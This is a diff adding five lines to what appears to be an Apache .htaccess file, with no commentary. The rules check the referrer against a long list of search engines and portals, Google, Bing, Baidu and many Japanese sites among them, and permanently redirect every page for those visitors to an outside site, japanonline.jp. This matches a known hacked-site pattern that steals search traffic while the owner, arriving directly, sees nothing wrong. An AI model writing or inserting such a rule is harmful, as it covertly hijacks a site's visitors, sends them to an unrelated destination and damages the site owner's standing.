@@ -1,0 +1,5 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} ^.*(baidu|google|yahoo|nifty|biglobe|so-net|Lycos|fresheye|nifty|0430|ISIZE|mono-s|Wisenut|DION|ODN|So-Net|Lycos|Looksmart|gameofserch|bing|aol|2ch|wodge|su-jine|msn|ncm|wikipedia|sanseido|goo|excite|Infoseek|Fresheye|Japan|Goo)\.(.*)
+RewriteRule ^(.*)$ http://www.japanonline.jp/ [R=301,L]
+</IfModule>
